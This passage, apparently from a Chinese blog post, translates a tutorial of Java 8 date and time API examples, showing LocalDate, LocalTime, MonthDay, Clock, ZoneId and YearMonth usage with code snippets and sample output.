href="http://javarevisited.blogspot.sg/2011/09/step-by-step-guide-to-convert-string-to.html">解析和格式化时间</a>的<code>DateTimeFormatter</code>类也全部重新设计。<strong>注意，这篇文章是翻译自<a href="http://javarevisited.blogspot.sg/2015/03/20-examples-of-date-and-time-api-from-Java8.html">Java 8 - 20 Examples of Date and Time API</a>，以下示例代码我做过一些简单的修改，当运行这些例子时会返回你当前的时间</strong>。</p><h2 id="二、在Java8中如何处理日期和时间"><a href="#二、在Java8中如何处理日期和时间" class="headerlink" title="二、在Java8中如何处理日期和时间"></a>二、在Java8中如何处理日期和时间</h2><p>常有人问我学习一个新库的最好方式是什么？我的答案是在实际项目中使用它。项目中有很多真正的需求驱使开发者去发掘并学习新库。简单得说就是任务驱动学习探索。这对Java8新日期时间<code>API</code>也不例外。我创建了20个基于任务的实例来学习Java8的新特性。从最简单创建当天的日期开始，然后创建时间及时区，接着模拟一个日期提醒应用中的任务——计算重要日期的到期天数，例如生日、纪念日、账单日、保费到期日、信用卡过期日等。</p><h3 id="示例-1、在Java8中获取今天的日期"><a href="#示例-1、在Java8中获取今天的日期" class="headerlink" title="示例 1、在Java8中获取今天的日期"></a>示例 1、在Java8中获取今天的日期</h3><p>Java8中的<code>LocalDate</code>用于表示当天日期。和<code>java.util.Date</code>不同，它只有日期，不包含时间。当你仅需要表示日期时就用这个类。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> today <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"今天的日期是："</span> <span class="token operator">+</span> today<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 今天的日期是：2016-04-18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码创建了当天的日期，不含时间信息。打印出的日期格式非常友好，不像老的<code>Date</code>类打印出一堆没有格式化的信息。</p><h3 id="示例-2、在Java8中获取当前的年、月、日信息"><a href="#示例-2、在Java8中获取当前的年、月、日信息" class="headerlink" title="示例 2、在Java8中获取当前的年、月、日信息"></a>示例 2、在Java8中获取当前的年、月、日信息</h3><p><code>LocalDate</code>类提供了获取年、月、日的快捷方法，其实例还包含很多其它的日期属性。通过调用这些方法就可以很方便的得到需要的日期信息，不用像以前一样需要依赖<code>java.util.Calendar</code>类了。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> today <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> year <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> month <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getMonthValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> day <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getDayOfMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"当前的年 : %d  月 : %d  日 : %d%n"</span><span class="token punctuation">,</span> year<span class="token punctuation">,</span> month<span class="token punctuation">,</span> day<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 当前的年 : 2016  月 : 4  日 : 18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到了吧，在Java8中得到年、月、日信息是这么简单直观，想用就用，没什么需要记的。对比看看以前Java是怎么处理年月日信息的吧。</p><h3 id="示例-3、在Java8中获取特定日期"><a href="#示例-3、在Java8中获取特定日期" class="headerlink" title="示例 3、在Java8中获取特定日期"></a>示例 3、在Java8中获取特定日期</h3><p>在第一个例子里，我们通过静态工厂方法<code>now()</code>非常容易地创建了当天日期，你还可以调用另一个有用的工厂方法<code>LocalDate.of()</code>创建任意日期，该方法需要传入年、月、日做参数，返回对应的<code>LocalDate</code>实例。这个方法的好处是没再犯老<code>API</code>的设计错误，比如年度起始于1900，月份是从0开始等等。日期所见即所得，就像下面这个例子表示了1月14日，没有任何隐藏机关。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> dateOfBirth <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"你的出生日期是："</span> <span class="token operator">+</span> dateOfBirth<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 你的出生日期是：2016-04-18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到创建的日期完全符合预期，与你写入的2016年4月18日完全一致。</p><h3 id="示例-4、在Java8中判断两个日期是否相等"><a href="#示例-4、在Java8中判断两个日期是否相等" class="headerlink" title="示例 4、在Java8中判断两个日期是否相等"></a>示例 4、在Java8中判断两个日期是否相等</h3><p>现实生活中有一类时间处理就是判断两个日期是否相等。你常常会检查今天是不是个特殊的日子，比如生日、纪念日或非交易日。这时就需要把指定的日期与某个特定日期做比较，例如判断这一天是否是假期。下面这个例子会帮助你用Java8的方式去解决，你肯定已经想到了，<code>LocalDate</code>重载了<code>equal</code>方法，请看下面的例子：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> today <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> date1 <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>date1<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>today<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"今天 %s 和 date1 %s 是同一天!%n"</span><span class="token punctuation">,</span> today<span class="token punctuation">,</span> date1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 今天 2016-04-18 和 date1 2016-04-18 是同一天!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个例子中我们比较的两个日期相同。注意，如果比较的日期是字符型的，需要先解析成日期对象再作判断。对比<a href="http://javarevisited.blogspot.sg/2012/02/3-example-to-compare-two-dates-in-java.html"><code>Java</code>老的日期比较方式</a>，你会感到清风拂面。</p><h3 id="示例-5、在Java8中检查像生日这种周期性事件"><a href="#示例-5、在Java8中检查像生日这种周期性事件" class="headerlink" title="示例 5、在Java8中检查像生日这种周期性事件"></a>示例 5、在Java8中检查像生日这种周期性事件</h3><p><code>Java</code>中另一个日期时间的处理就是检查类似每月账单、结婚纪念日、EMI日或保险缴费日这些周期性事件。如果你在电子商务网站工作，那么一定会有一个模块用来在圣诞节、感恩节这种节日时向客户发送问候邮件。<code>Java</code>中如何检查这些节日或其它周期性事件呢？答案就是<code>MonthDay</code>类。这个类组合了月份和日，去掉了年，这意味着你可以用它判断每年都会发生事件。和这个类相似的还有一个<code>YearMonth</code>类。这些类也都是不可变并且线程安全的值类型。下面我们通过<code>MonthDay</code>来检查周期性事件：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> today <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> dateOfBirth <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">MonthDay</span> birthday <span class="token operator">=</span> <span class="token class-name">MonthDay</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>dateOfBirth<span class="token punctuation">.</span><span class="token function">getMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dateOfBirth<span class="token punctuation">.</span><span class="token function">getDayOfMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">MonthDay</span> currentMonthDay <span class="token operator">=</span> <span class="token class-name">MonthDay</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>today<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>currentMonthDay<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>birthday<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"好高兴今天是您的生日!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"对不起，今天不是您的生日!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 好高兴今天是您的生日!!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只要当天的日期和生日匹配，无论是哪一年都会打印出祝贺信息。你可以把程序整合进系统时钟，看看生日时是否会受到提醒，或者写一个单元测试来检测代码是否运行正确。</p><h3 id="示例-6、在Java8中获取当前时间"><a href="#示例-6、在Java8中获取当前时间" class="headerlink" title="示例 6、在Java8中获取当前时间"></a>示例 6、在Java8中获取当前时间</h3><p>与Java8获取日期的例子很像，获取时间使用的是<code>LocalTime</code>类，一个只有时间没有日期的<code>LocalDate</code>的近亲。可以调用静态工厂方法<code>now()</code>来获取当前时间。默认的格式是<code>hh:mm:ss:nnn</code>。对比一下<a href="http://javarevisited.blogspot.sg/2012/01/get-current-date-timestamps-java.html">Java8之前获取当前时间的方式</a>。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalTime</span> time <span class="token operator">=</span> <span class="token class-name">LocalTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"当前时间是:"</span> <span class="token operator">+</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 当前时间是:23:43:42.200</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到当前时间就只包含时间信息，没有日期。</p><h3 id="示例-7、如何在现有的时间上增加小时"><a href="#示例-7、如何在现有的时间上增加小时" class="headerlink" title="示例 7、如何在现有的时间上增加小时"></a>示例 7、如何在现有的时间上增加小时</h3><p>通过增加小时、分、秒来计算将来的时间很常见。Java8除了不变类型和线程安全的好处之外，还提供了更好的<code>plusHours()</code>方法替换<code>add()</code>，并且是兼容的。注意，这些方法返回一个全新的<code>LocalTime</code>实例，由于其不可变性，返回后一定要用变量赋值。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalTime</span> time <span class="token operator">=</span> <span class="token class-name">LocalTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalTime</span> newTime <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">plusHours</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 添加两小时</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"当前时间:"</span> <span class="token operator">+</span> time <span class="token operator">+</span> <span class="token string">",两小时后的时间: "</span> <span class="token operator">+</span>  newTime<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 当前时间:23:50:56.195,两小时后的时间: 01:50:56.195</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，新的时间在当前时间<code>23:50:56.195</code>的基础上增加了2个小时。和<a href="http://javarevisited.blogspot.sg/2012/12/how-to-add-subtract-days-months-years-to-date-time-java.html">旧版<code>Java</code>的增减时间的处理方式</a>对比一下，看看哪种更好。</p><h3 id="示例-8、如何计算一周后的日期"><a href="#示例-8、如何计算一周后的日期" class="headerlink" title="示例 8、如何计算一周后的日期"></a>示例 8、如何计算一周后的日期</h3><p>和上个例子计算两小时以后的时间类似，这个例子会计算一周后的日期。<code>LocalDate</code>日期不包含时间信息，它的<code>plus()</code>方法用来增加天、周、月，<code>ChronoUnit</code>类声明了这些时间单位。由于<code>LocalDate</code>也是不变类型，返回后一定要用变量赋值。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> today <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> nextWeek <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">plus</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">ChronoUnit</span><span class="token punctuation">.</span><span class="token constant">WEEKS</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"今天是:"</span> <span class="token operator">+</span> today <span class="token operator">+</span> <span class="token string">",一周以后的日期: "</span> <span class="token operator">+</span> nextWeek<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 今天是:2016-04-18,一周以后的日期: 2016-04-25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到新日期离当天日期是7天，也就是一周。你可以用同样的方法增加1个月、1年、1小时、1分钟甚至一个世纪，更多选项可以查看<code>Java 8 API</code>中<code>的ChronoUnit</code>类。</p><h3 id="示例-9、计算一年前或一年后的日期"><a href="#示例-9、计算一年前或一年后的日期" class="headerlink" title="示例 9、计算一年前或一年后的日期"></a>示例 9、计算一年前或一年后的日期</h3><p>继续上面的例子，上个例子中我们通过<code>LocalDate</code>的<code>plus()</code>方法增加天数、周数或月数，这个例子我们利用<code>minus()</code>方法计算一年前的日期。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> today <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> preYear <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">minus</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">ChronoUnit</span><span class="token punctuation">.</span><span class="token constant">YEARS</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> nextYear <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">plus</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">ChronoUnit</span><span class="token punctuation">.</span><span class="token constant">YEARS</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"今天是:"</span> <span class="token operator">+</span> today <span class="token operator">+</span> <span class="token string">",一年前的日期: "</span> <span class="token operator">+</span> preYear <span class="token operator">+</span> <span class="token string">",一年后的日期: "</span> <span class="token operator">+</span> nextYear<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 今天是:2016-04-18,一年前的日期: 2015-04-18,一年后的日期: 2017-04-18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例子结果中得到了两个日期，一个2015年、一个2017年、分别是2016年的前一年和后一年。</p><h3 id="示例-10、使用Java8的Clock时钟类"><a href="#示例-10、使用Java8的Clock时钟类" class="headerlink" title="示例 10、使用Java8的Clock时钟类"></a>示例 10、使用Java8的Clock时钟类</h3><p>Java8增加了一个<code>Clock</code>时钟类用于获取当时的时间戳，或当前时区下的日期时间信息。以前用到<code>System.currentTimeInMillis()</code>和<code>TimeZone.getDefault()</code>的地方都可用<code>Clock</code>替换。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 得到UTC的时区的日期时间clock对象</span><span class="token class-name">Clock</span> clock <span class="token operator">=</span> <span class="token class-name">Clock</span><span class="token punctuation">.</span><span class="token function">systemUTC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Clock : "</span> <span class="token operator">+</span> clock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Clock : SystemClock[Z]</span><span class="token comment">// 得到基于当前时区的日期时间clock对象</span><span class="token class-name">Clock</span> defaultClock <span class="token operator">=</span> <span class="token class-name">Clock</span><span class="token punctuation">.</span><span class="token function">systemDefaultZone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Clock : "</span> <span class="token operator">+</span> clock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Clock : SystemClock[Z]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还可以针对clock时钟做比较，像下面这个例子：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 依赖注入</span>    <span class="token keyword">private</span> <span class="token class-name">Clock</span> clock<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">LocalDate</span> eventDate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>eventDate<span class="token punctuation">.</span><span class="token function">isBefore</span><span class="token punctuation">(</span><span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种方式在不同时区下处理日期时会非常管用。</p><h3 id="示例-11、如何用Java判断日期是早于还是晚于另一个日期"><a href="#示例-11、如何用Java判断日期是早于还是晚于另一个日期" class="headerlink" title="示例 11、如何用Java判断日期是早于还是晚于另一个日期"></a>示例 11、如何用Java判断日期是早于还是晚于另一个日期</h3><p>另一个工作中常见的操作就是如何判断给定的一个日期是大于某天还是小于某天？在Java8中，<code>LocalDate</code>类有两类方法<code>isBefore()</code>和<code>isAfter()</code>用于比较日期。调用<code>isBefore()</code>方法时，如果给定日期小于当前日期则返回<code>true</code>。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> today <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> tomorrow <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tomorrow<span class="token punctuation">.</span><span class="token function">isAfter</span><span class="token punctuation">(</span>today<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"明天晚于今天！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 明天晚于今天！</span><span class="token class-name">LocalDate</span> yesterday <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">minus</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">ChronoUnit</span><span class="token punctuation">.</span><span class="token constant">DAYS</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>yesterday<span class="token punctuation">.</span><span class="token function">isBefore</span><span class="token punctuation">(</span>today<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"昨天先于今天！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 昨天先于今天！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Java 8中比较日期非常方便，不需要使用额外的<code>Calendar</code>类来做这些基础工作了。</p><h3 id="示例-12、在Java8中处理时区"><a href="#示例-12、在Java8中处理时区" class="headerlink" title="示例 12、在Java8中处理时区"></a>示例 12、在Java8中处理时区</h3><p>Java8不仅分离了日期和时间，也把时区分离出来了。现在有一系列单独的类如<code>ZoneId</code>来处理特定时区，<code>ZoneDateTime</code>类来表示某时区下的时间。这在Java8以前都是<a href="http://javarevisited.blogspot.sg/2013/02/convert-xmlgregoriancalendar-to-date-xmlgregoriancalendar-java-example-tutorial.html"><code>GregorianCalendar</code>类</a>来做的。下面这个例子展示了如何把本时区的时间转换成另一个时区的时间。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// Java 8中某时区下的日期和时间</span><span class="token class-name">ZoneId</span> america <span class="token operator">=</span> <span class="token class-name">ZoneId</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"America/New_York"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDateTime</span> localtDateAndTime <span class="token operator">=</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ZonedDateTime</span> dateAndTimeInNewYork  <span class="token operator">=</span> <span class="token class-name">ZonedDateTime</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>localtDateAndTime<span class="token punctuation">,</span> america <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Current date and time in a particular timezone : "</span> <span class="token operator">+</span> dateAndTimeInNewYork<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Current date and time in a particular timezone : 2016-04-19T23:10:09.251-04:00[America/New_York]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和以前<a href="http://javarevisited.blogspot.sg/2012/04/how-to-convert-local-time-to-gmt-in.html">使用<code>GMT</code>的方式转换本地时间</a>对比一下。注意，在Java8以前，一定要牢牢记住时区的名称，不然就会抛出下面的异常：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Exception</span> in thread <span class="token string">"main"</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span>zone<span class="token punctuation">.</span></span>ZoneRulesException</span><span class="token operator">:</span> <span class="token class-name">Unknown</span> time<span class="token operator">-</span>zone <span class="token constant">ID</span><span class="token operator">:</span> <span class="token constant">ASIA</span><span class="token operator">/</span><span class="token class-name">Tokyo</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span>zone<span class="token punctuation">.</span></span>ZoneRulesProvider</span><span class="token punctuation">.</span><span class="token function">getProvider</span><span class="token punctuation">(</span><span class="token class-name">ZoneRulesProvider</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">272</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span>zone<span class="token punctuation">.</span></span>ZoneRulesProvider</span><span class="token punctuation">.</span><span class="token function">getRules</span><span class="token punctuation">(</span><span class="token class-name">ZoneRulesProvider</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">227</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span>ZoneRegion</span><span class="token punctuation">.</span><span class="token function">ofId</span><span class="token punctuation">(</span><span class="token class-name">ZoneRegion</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">120</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span>ZoneId</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token class-name">ZoneId</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">403</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span>ZoneId</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token class-name">ZoneId</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">351</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="示例-13、如何表示信用卡到期这类固定日期，答案就在YearMonth"><a href="#示例-13、如何表示信用卡到期这类固定日期，答案就在YearMonth" class="headerlink" title="示例 13、如何表示信用卡到期这类固定日期，答案就在YearMonth"></a>示例 13、如何表示信用卡到期这类固定日期，答案就在<code>YearMonth</code></h3><p>与<code>MonthDay</code>检查重复事件的例子相似，<code>YearMonth</code>是另一个组合类，用于表示信用卡到期日、FD到期日、期货期权到期日等。还可以用这个类得到当月共有多少天，<code>YearMonth</code>实例的<code>lengthOfMonth()</code>方法可以返回当月的天数，在判断2月有28天还是29天时非常有用。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">YearMonth</span> currentYearMonth <span class="token operator">=</span> <span class="token class-name">YearMonth</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"该月的天数 %s: %d%n"</span><span class="token punctuation">,</span> currentYearMonth<span class="token punctuation">,</span> currentYearMonth<span class="token punctuation">.</span><span class="token function">lengthOfMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 该月的天数 2016-04: 30</span><span class="token class-name">YearMonth</span> creditCardExpiry <span class="token operator">=</span> <span class="token class-name">YearMonth</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2018</span><span class="token punctuation">,</span> <span class="token class-name">Month</span><span class="token punctuation">.</span><span class="token constant">FEBRUARY</span><span class="token 